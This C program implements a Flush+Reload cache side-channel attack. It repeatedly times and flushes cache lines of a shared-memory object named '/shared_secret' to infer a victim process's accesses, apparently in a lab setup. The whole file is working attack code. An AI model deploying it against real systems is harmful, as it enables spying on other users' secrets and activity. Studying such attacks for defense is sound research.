#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <x86intrin.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/shm.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>

#define SIZE 4096

uint64_t rdtsc() {
  uint64_t a, d;
  asm volatile ("mfence");
  asm volatile ("rdtsc" : "=a" (a), "=d" (d));
  a = (d<<32) | a;
  asm volatile ("mfence");
  return a;
}

uint64_t rdtsc_begin() {
  uint64_t a, d;
  asm volatile ("mfence\n\t"
    "CPUID\n\t"
    "RDTSCP\n\t"
    "mov %%rdx, %0\n\t"
    "mov %%rax, %1\n\t"
    "mfence\n\t"
    : "=r" (d), "=r" (a)
    :
    : "%rax", "%rbx", "%rcx", "%rdx");
  a = (d<<32) | a;
  return a;
}

uint64_t rdtsc_end() {
  uint64_t a, d;
  asm volatile("mfence\n\t"
    "RDTSCP\n\t"
    "mov %%rdx, %0\n\t"
    "mov %%rax, %1\n\t"
    "CPUID\n\t"
    "mfence\n\t"
    : "=r" (d), "=r" (a)
    :
    : "%rax", "%rbx", "%rcx", "%rdx");
  a = (d<<32) | a;
  return a;
}

void maccess(void* p)
{
  asm volatile ("movq (%0), %%rax\n"
    :
    : "c" (p)
    : "rax");
}

void flush(void* p) {
    asm volatile ("clflush 0(%0)\n"
      :
      : "c" (p)
      : "rax");
}

int main(int argc, char *argv[]) {
    const char *shm_name = "/shared_secret";
    int len = SIZE;

    // Open the shared memory object
    int shm_fd = shm_open(shm_name, O_RDONLY, 0666);
    if (shm_fd == -1) {
        perror("shm_open");
        exit(1);
    }

    // Map the shared memory object into this process's address space
    char *shared_memory = mmap(0, len, PROT_READ, MAP_SHARED, shm_fd, 0);
    if (shared_memory == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }

    // printf("The virtual address of the mapped shared memory is: %p\n", (void*)shared_memory);
    printf("Running Attack\n");

    size_t start = 0;
    size_t keystate = 0;
    size_t kpause = 0;
    while (1) {
        for (size_t i = 0; i < len - 8; i += 64) {

            size_t time = rdtsc_begin();
            maccess(&shared_memory[i]);
            size_t delta = rdtsc_end() - time;
            flush(&shared_memory[i]);
            if (delta < 200)
            {
                if (kpause > 1000)
                {
                // printf("Cache Hit %10lu after %10lu cycles, t=%10lu us\n", delta, kpause, (time-start)/2600);
                keystate = (keystate+1) % 2;
                }
                kpause = 0;
            }
            else
                kpause++;
        }
    }

    // Clean up
    munmap(shared_memory, len);
    close(shm_fd);

    return 0;
}
